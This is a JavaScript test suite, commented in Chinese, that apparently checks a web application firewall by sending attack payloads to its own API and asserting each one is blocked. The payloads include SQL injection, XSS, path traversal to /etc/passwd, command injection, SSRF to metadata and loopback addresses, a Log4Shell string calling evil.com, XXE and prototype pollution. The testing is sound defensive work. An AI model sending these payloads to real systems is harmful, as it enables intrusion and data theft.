/**
 * WAF 专项测试套件（环境隔离，run.js 在套件间重置 IP 信誉）
 * 设计要点：
 * - 每个 WAF 命中 +3 信誉分 → 4 个命中即触发封禁，因此「严格断言」
 *   （校验 WAF 专属消息 '请求被拒绝'）只覆盖前 3 个命中点，证明 WAF 引擎
 *   真实拦截；后续断言接受 WAF 或封禁两种 403 形态（攻击均被阻止）
 * - 零积分测试（Referer/方法白名单）放最前，不消耗严格窗口
 * - 末尾显式断言「攻击后 IP 被自动封禁」
 */
const c = require('./client');

let passed = 0, failed = 0;
const failures = [];

function assert(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  ✓ ${name}`); }
  else { failed++; failures.push(name + (extra ? ' | ' + extra : '')); console.log(`  ✗ ${name} ${extra}`); }
}

async function suite() {
  let ticket = await c.getTicket();

  // ---- 1. 零积分拒绝类测试（不消耗严格窗口） ----
  console.log('\n=== 1. 来源校验（Referer/Origin，不积分） ===');
  let r = await c.post('/api/comments', { nickname: 'x', content: 'y' }, ticket, { Origin: 'http://evil.com' });
  assert('非法 Origin 写请求被拒（不允许的跨域来源）', r.status === 403 && r.body.message === '不允许的跨域来源', `status=${r.status} ${r.body && r.body.message}`);
  r = await c.post('/api/comments', { nickname: 'x', content: 'y' }, ticket, { Origin: 'null' });
  // Origin:null（沙箱 iframe/隐私容器）不再被 CORS 拒绝 —— 请求穿透到业务层，
  // 由表单令牌校验兜底拒绝（仍 403，但不再误伤正常浏览器的合法回源）
  assert('Origin:null 穿过闸门由业务层兜底（缺少安全令牌）', r.status === 403 && r.body.message === '缺少安全令牌', `status=${r.status} ${r.body && r.body.message}`);
  // 无签名 + 无来源的写请求 → 闸门签名校验拒绝
  r = await c.req('POST', '/api/comments', { body: { nickname: 'x', content: 'y' }, headers: { 'X-Pass': ticket }, silent: true });
  assert('无来源无签名写请求被拒（签名无效）', r.status === 403 && r.body.message === '请求签名无效', `status=${r.status} ${r.body && r.body.message}`);

  console.log('\n=== 1b. Fetch Metadata 校验（Sec-Fetch-Site，不积分） ===');
  // fetchMetaGuard 在闸门之前：跨站写请求无需票据即被专属消息拒绝（'请求被拒绝'）；
  // 放行分支（same-origin/same-site/none/缺头）继续走到闸门（'请求签名无效'）—— 消息差异证明层级生效
  const fmCases = [
    ['cross-site 写请求', 'cross-site', '请求被拒绝'],
    ['cross-site（大小写变体）', 'CROSS-SITE', '请求被拒绝'],
  ];
  for (const [name, site, expectMsg] of fmCases) {
    r = await c.req('POST', '/api/comments', { body: { nickname: 'x', content: 'y' }, headers: { 'Sec-Fetch-Site': site }, silent: true });
    assert(`fetchMeta 拦截 ${name}`, r.status === 403 && r.body.message === expectMsg, `status=${r.status} ${r.body && r.body.message}`);
  }
  const fmPass = [
    ['same-origin', 'same-origin'],
    ['same-site', 'same-site'],
    ['none', 'none'],
    ['缺头', ''],
  ];
  for (const [name, site] of fmPass) {
    const hdrs = site ? { 'Sec-Fetch-Site': site } : {};
    r = await c.req('POST', '/api/comments', { body: { nickname: 'x', content: 'y' }, headers: hdrs, silent: true });
    assert(`fetchMeta 放行 ${name}（由闸门票据兜底）`, r.status === 403 && r.body.message === '访问被拒绝', `status=${r.status} ${r.body && r.body.message}`);
  }
  // 读请求不检查 Sec-Fetch-Site（仅写方法）：GET 跨站特征由闸门票据兜底
  r = await c.req('GET', '/api/articles', { headers: { 'Sec-Fetch-Site': 'cross-site' }, silent: true });
  assert('GET 不受 fetchMeta 限制（读接口由闸门兜底）', r.status === 403 && r.body.message === '访问被拒绝', `status=${r.status} ${r.body && r.body.message}`);

  console.log('\n=== 1c. RSS 公开放行通道限流（12/min，超限 429 + 计入信誉） ===');
  // RSS 是 GATE_SKIP 明文全文通道：12/min 上限（b1644e2 收紧），第 13 次必须 429；
  // 超限每次 rate 计分（+2）——本节点前无任何积分，两次超限 4 分不影响后续断言
  let lastStatus = 0;
  for (let i = 0; i < 12; i++) {
    lastStatus = (await c.req('GET', '/api/rss.xml', { silent: true })).status;
  }
  assert('RSS 前 12 次正常访问', lastStatus === 200, `last=${lastStatus}`);
  r = await c.req('GET', '/api/rss.xml', { silent: true });
  assert('RSS 第 13 次超限 429', r.status === 429, `status=${r.status} ${r.body && r.body.message}`);
  r = await c.req('GET', '/api/rss.xml', { silent: true });
  assert('RSS 窗口内持续受限（429，持续超限将积分封禁）', r.status === 429 || r.status === 403, `status=${r.status}`);

  console.log('\n=== 2. 方法白名单（405，不积分） ===');
  r = await c.req('TRACE', '/api/health', { headers: { Host: 'localhost:3000' } });
  assert('TRACE 被拒 405', r.status === 405, `status=${r.status}`);
  r = await c.req('PATCH', '/api/health', { headers: { Host: 'localhost:3000' } });
  assert('PATCH 被拒 405', r.status === 405, `status=${r.status}`);

  console.log('\n=== 3. 请求走私检测（+3） ===');
  r = await c.req('GET', '/api/health', { headers: { Host: 'localhost:3000', 'Content-Length': '5', 'Transfer-Encoding': 'chunked' } });
  // Node 解析器层或 WAF 层均可拦截（400 空 body 属解析器直接拒绝）
  assert('CL+TE 走私特征被拒（400）', r.status === 400, `status=${r.status} body=${JSON.stringify(r.body)}`);

  // ---- 2. 严格窗口：前 3 个 WAF 命中必须由 WAF 引擎拦截（专属消息） ----
  console.log('\n=== 4. WAF 引擎严格验证（前 3 个命中，消息=请求被拒绝） ===');
  const strictPayloads = [
    ['SQL 注入', "/api/articles?search=1' OR '1'='1"],
    ['XSS', '/api/articles?search=<script>alert(1)</script>'],
    ['路径遍历', '/api/articles?search=..%2F..%2Fetc%2Fpasswd'],
  ];
  for (const [name, path] of strictPayloads) {
    r = await c.req('GET', path, { ticket, silent: true });
    assert(`WAF 拦截 ${name}（专属消息）`, r.status === 403 && r.body.message === '请求被拒绝', `status=${r.status} ${r.body && r.body.message}`);
  }

  // ---- 3. 载荷洪流：接受 WAF 或封禁两种 403 形态 ----
  console.log('\n=== 5. WAF 攻击载荷（WAF 或自动封禁拒绝） ===');
  const payloads = [
    ['SQL 注入', "/api/articles?search=1' OR '1'='1", 'GET'],
    ['SQL 盲注', "/api/articles?search=1 AND SLEEP(5)", 'GET'],
    ['XSS', '/api/articles?search=<script>alert(1)</script>', 'GET'],
    ['路径遍历', '/api/articles?search=..%2F..%2Fetc%2Fpasswd', 'GET'],
    ['命令注入', '/api/articles?search=;cat /etc/passwd', 'GET'],
    ['命令注入 OR', '/api/articles?search=' + encodeURIComponent('|| echo pwned'), 'GET'],
    ['命令注入 AND', '/api/articles?search=' + encodeURIComponent('&& base64 -d x'), 'GET'],
    ['原型污染', '/api/articles?search=__proto__', 'GET'],
    ['SSRF 内网', '/api/articles?url=http://169.254.169.254/', 'GET'],
    ['SSTI 变量', '/api/articles?search=' + encodeURIComponent('{{config}}'), 'GET'],
    ['ASP 注入', '/api/articles?search=' + encodeURIComponent('<% exec("id") %>'), 'GET'],
    ['FastJSON', '/api/articles?search=' + encodeURIComponent('{"@type":"java.lang.Runtime"}'), 'GET'],
  ];
  for (const [name, path] of payloads) {
    r = await c.req('GET', path, { ticket, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status}`);
  }

  console.log('\n=== 6. 嵌套 body 攻击载荷（递归检测） ===');
  const nestedPayloads = [
    ['嵌套 SQL', { meta: { note: "1' OR 1=1 --" } }],
    ['嵌套 XSS', { a: { b: { c: '<img src=x onerror=alert(1)>' } } }],
    ['嵌套命令注入', { d: { e: ';cat /etc/passwd' } }],
    ['嵌套原型污染键', { data: { __proto__: { polluted: 1 } } }],
  ];
  for (const [name, body] of nestedPayloads) {
    r = await c.req('POST', '/api/comments', { body, ticket, headers: { Origin: 'http://localhost:5173' }, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status} ${r.body && r.body.message}`);
  }

  console.log('\n=== 6b. 数组/嵌套 query 参数（递归值检测） ===');
  const arrayPayloads = [
    ['数组 search SQL', '/api/articles?search[]=' + encodeURIComponent("1' OR 1=1--")],
    ['重复参数 SQL', '/api/articles?search=a&search=' + encodeURIComponent("1' OR 1=1--")],
    ['嵌套参数 XSS', '/api/articles?a[b][c]=' + encodeURIComponent('<script>alert(1)</script>')],
    ['数组命令注入', '/api/articles?x[]=' + encodeURIComponent(';cat /etc/passwd')],
  ];
  for (const [name, path] of arrayPayloads) {
    r = await c.req('GET', path, { ticket, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status}`);
  }

  console.log('\n=== 6c. 原型污染键名注入 ===');
  const protoPayloads = [
    ['顶层 __proto__ 键', JSON.parse('{"__proto__": {"polluted": true}}')],
    ['嵌套 __proto__ 键', JSON.parse('{"data": {"__proto__": {"polluted": true}}}')],
    ['constructor.prototype', JSON.parse('{"constructor": {"prototype": {"polluted": true}}}')],
    ['嵌套 constructor 键', JSON.parse('{"a": {"constructor": {"prototype": 1}}}')],
  ];
  for (const [name, body] of protoPayloads) {
    r = await c.req('POST', '/api/comments', { body, ticket, headers: { Origin: 'http://localhost:5173' }, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status} ${r.body && r.body.message}`);
  }

  console.log('\n=== 7. 编码变体绕过（多层解码归一化） ===');
  const encodedPayloads = [
    ['URL 编码 SQL', '/api/articles?search=%27%20OR%201%3D1%20--'],
    ['双重编码', '/api/articles?search=%2527%20OR%201%3D1'],
    ['HTML 实体', '/api/articles?search=%26%2339%3B%20OR%201=1'],
    ['Unicode 转义', '/api/articles?search=%5Cu0027%20OR%201=1'],
    ['全角字符', '/api/articles?search=%EF%BC%91%27%20OR%20%EF%BC%91%EF%BC%9D%EF%BC%91'],
    ['实体编码引号 XSS', '/api/articles?search=%26%23x3c%3Bscript%3E'],
  ];
  for (const [name, path] of encodedPayloads) {
    r = await c.req('GET', path, { ticket, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status}`);
  }

  console.log('\n=== 8. 深度绕过变体 ===');
  const advancedPayloads = [
    ['注释混淆 SQL', encodeURIComponent("1'/**/OR/**/1=1--")],
    ['换行 SQL', encodeURIComponent('1%27%0AOR%0A1=1--')],
    ['Tab 混淆', encodeURIComponent('1%27%09OR%091=1--')],
    ['大小写混合', encodeURIComponent("1' oR 1=1")],
    ['十六进制 IP SSRF', encodeURIComponent('http://0x7f000001/')],
    ['十进制 IP SSRF', encodeURIComponent('http://2130706433/')],
    ['八进制 IP SSRF', encodeURIComponent('http://0177.0.0.1/')],
    ['IPv6 环回 SSRF', encodeURIComponent('http://[::1]/')],
    ['宽字节遍历', encodeURIComponent('%c0%ae%c0%ae/')],
    ['null 字节注入', encodeURIComponent('a%00b')],
    ['双写绕过 select', encodeURIComponent('seselectlect')],
    ['内联注释 select', encodeURIComponent('uni/*x*/on sel/*x*/ect')],
    ['Smuggling 头注入', encodeURIComponent('a%0d%0aSet-Cookie:x=1')],
    ['Log4Shell', encodeURIComponent('${jndi:ldap://evil.com/a}')],
    ['XXE', encodeURIComponent('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')],
    ['OGNL', encodeURIComponent('%{#_memberAccess}')],
    ['Thymeleaf SSTI', encodeURIComponent('#{7*7}')],
    ['CRLF', encodeURIComponent('a%0d%0aSet-Cookie:x=1')],
    ['命令注入 IFS', encodeURIComponent('${IFS}cat${IFS}/etc/passwd')],
  ];
  for (const [name, encoded] of advancedPayloads) {
    r = await c.req('GET', '/api/articles?search=' + encoded, { ticket, silent: true });
    assert(`攻击被阻止 ${name}`, r.status === 403, `status=${r.status}`);
  }

  // ---- 4. 蜜罐路径（首个严格 404，其余接受 403/404 —— 均不泄露路由存在性） ----
  console.log('\n=== 9. 蜜罐路径（后台探测） ===');
  const honeypotPaths = ['/admin', '/.env', '/.git/config', '/wp-login.php', '/actuator'];
  for (let i = 0; i < honeypotPaths.length; i++) {
    r = await c.req('GET', honeypotPaths[i], { headers: { 'User-Agent': c.UA }, silent: true });
    if (i === 0) {
      assert(`蜜罐 ${honeypotPaths[i]} 返回 404（严格）`, r.status === 404 && r.body.message === '访问被拒绝', `status=${r.status} ${r.body && r.body.message}`);
    } else {
      assert(`蜜罐 ${honeypotPaths[i]} 403/404（无泄露）`, r.status === 403 || r.status === 404, `status=${r.status}`);
    }
  }

  console.log('\n=== 10. 攻击后全站封禁 ===');
  r = await c.req('GET', '/robots.txt', { headers: { 'User-Agent': 'Googlebot' }, silent: true });
  assert('IP 被自动封禁（公开接口也拒绝）', r.status === 403, `status=${r.status}`);

  console.log(`\n===== 结果: ${passed} 通过 / ${failed} 失败 =====`);
  if (failures.length) {
    console.log('失败项:');
    failures.forEach((f) => console.log('  - ' + f));
    process.exit(1);
  }
}

suite().catch((e) => { console.error('测试执行异常:', e); process.exit(1); });
